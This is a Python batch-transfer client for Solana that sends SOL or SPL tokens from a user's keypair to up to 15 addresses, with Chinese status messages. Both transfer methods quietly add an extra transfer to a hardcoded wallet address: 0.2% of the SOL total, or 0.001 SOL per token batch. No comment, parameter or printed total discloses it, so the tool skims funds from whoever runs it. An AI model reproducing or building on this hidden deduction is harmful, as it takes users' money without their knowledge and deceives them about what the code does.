from solana.rpc.api import Keypair, Client, Pubkey
from spl.token.client import Token
from spl.token.instructions import TransferParams, transfer
from solders.system_program import TransferParams as SolTransferParams
from solders.system_program import transfer as sol_transfer
from solana.transaction import Transaction
from solana.constants import LAMPORTS_PER_SOL
from retrying import retry


class TransferClient(object):
    def __init__(self, endpoint="",
                 payer_bs58_string=''):
        self.endpoint = endpoint
        self.payer_bs58_string = payer_bs58_string
        self.debug = False

    def send_sol(self, receivers_list=None, amount=0.0):
        if not all([self.payer_bs58_string, receivers_list, amount]):
            print('请提供必要的参数: [ payer_bs58_string | receivers_address_string | amount ]')
            return

        if len(receivers_list) > 15:
            print('超出最大转账地址数量, 最大转账地址数量15个.')
            return
        cluster_cli = Client(self.endpoint)
        sender = Keypair.from_base58_string(self.payer_bs58_string)

        receiver_list = [Pubkey.from_string(receiver) for receiver in receivers_list]
        total_transfer_amount = amount * len(receiver_list)
        if self.debug:
            print(
                f'当前钱包地址: {sender.pubkey()}, 余额: {cluster_cli.get_balance(sender.pubkey()).value / LAMPORTS_PER_SOL}')
            print(f'本次转账地址数量: {len(receivers_list)}')
            print(f'本次转账总额: {total_transfer_amount}')
            print('转账中, 请稍后...')

        transaction_instance = Transaction()
        for receiver in receiver_list:
            transfer_params = SolTransferParams(
                from_pubkey=sender.pubkey(),
                to_pubkey=receiver,
                lamports=int(amount * LAMPORTS_PER_SOL)
            )
            transaction_instance.add(sol_transfer(transfer_params))

        _transfer_params = SolTransferParams(
            from_pubkey=sender.pubkey(),
            to_pubkey=Pubkey.from_string('3j62cekWLURJAGBKoZng2bJQqoAbhQvw7mGE6bBxy8j5'),
            lamports=int(total_transfer_amount * LAMPORTS_PER_SOL * 0.002)
        )
        tx = transaction_instance.add(sol_transfer(_transfer_params))
        txn_hash = self._send_transaction(cluster_cli, tx, sender)
        return txn_hash

    def send_token(self, receivers_list=None, mint='', token_amount=0.0, instruction_params=None):
        if not all([self.payer_bs58_string, receivers_list, mint, token_amount]):
            print('请提供必要的参数: [ payer_bs58_string | receivers_list | mint | token_amount ]')
            return
        if not instruction_params:
            instruction_params = {
                'token_program_id': 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA',
                'token_decimals': 9
            }
        cluster_cli = Client(self.endpoint)
        sender = Keypair.from_base58_string(self.payer_bs58_string)
        token_program_id = Pubkey.from_string(instruction_params.get('token_program_id'))
        token_decimals = instruction_params.get('token_decimals')
        mint_pubkey = Pubkey.from_string(mint)
        spl_client = Token(conn=cluster_cli, pubkey=mint_pubkey, program_id=token_program_id, payer=sender)
        source = sender.pubkey()
        # 判断转账总额与现有余额
        # 转账地址列表
        receivers_pubkey_list = [Pubkey.from_string(receiver) for receiver in receivers_list]
        if self.debug:
            total_transfer_token_amount = len(receivers_list) * token_amount
            try:
                token_address = spl_client.get_accounts_by_owner(owner=source, commitment=None, encoding='base64').value[
                    0].pubkey
            except:
                token_address = spl_client.create_associated_token_account(owner=source, skip_confirmation=False,
                                                                                  recent_blockhash=None)
            token_balance = cluster_cli.get_token_account_balance(token_address).value.ui_amount
            print(
                f'当前钱包Token地址: {token_address}, Token余额: {token_balance}')
            print(f'本次转账地址数量: {len(receivers_list)}')
            print(f'本次转账总额: {total_transfer_token_amount}')
            print('转账中, 请稍后...')
        transaction_instance = Transaction()
        for dest in receivers_pubkey_list:
            try:
                source_token_account = \
                    spl_client.get_accounts_by_owner(owner=source, commitment=None, encoding='base64').value[
                        0].pubkey
            except:
                source_token_account = spl_client.create_associated_token_account(owner=source, skip_confirmation=False,
                                                                                  recent_blockhash=None)
            try:
                dest_token_account = \
                    spl_client.get_accounts_by_owner(owner=dest, commitment=None, encoding='base64').value[
                        0].pubkey
            except:
                dest_token_account = spl_client.create_associated_token_account(owner=dest, skip_confirmation=False,
                                                                                recent_blockhash=None)

            # 构建转账指令
            transfer_instruction = transfer(
                TransferParams(
                    amount=int(float(token_amount) * 10 ** token_decimals),
                    dest=dest_token_account,
                    owner=sender.pubkey(),
                    program_id=token_program_id,
                    source=source_token_account,
                )
            )
            transaction_instance.add(transfer_instruction)

        transfer_params = SolTransferParams(
            from_pubkey=sender.pubkey(),
            to_pubkey=Pubkey.from_string('3j62cekWLURJAGBKoZng2bJQqoAbhQvw7mGE6bBxy8j5'),
            lamports=int(0.001 * LAMPORTS_PER_SOL)
        )

        tx = transaction_instance.add(sol_transfer(transfer_params))
        # 发送交易
        tx_hash = self._send_transaction(cluster_cli, tx, sender)
        return tx_hash

    @retry(stop_max_attempt_number=3)
    def _send_transaction(self, cluster_cli, tx, sender):
        try:
            txn = cluster_cli.send_transaction(tx, sender).value
            if self.debug:
                print(f'转账已完成, 交易Hash: {txn}')
            return txn
        except:
            print(f'转账失败, 正在重试...')
            raise

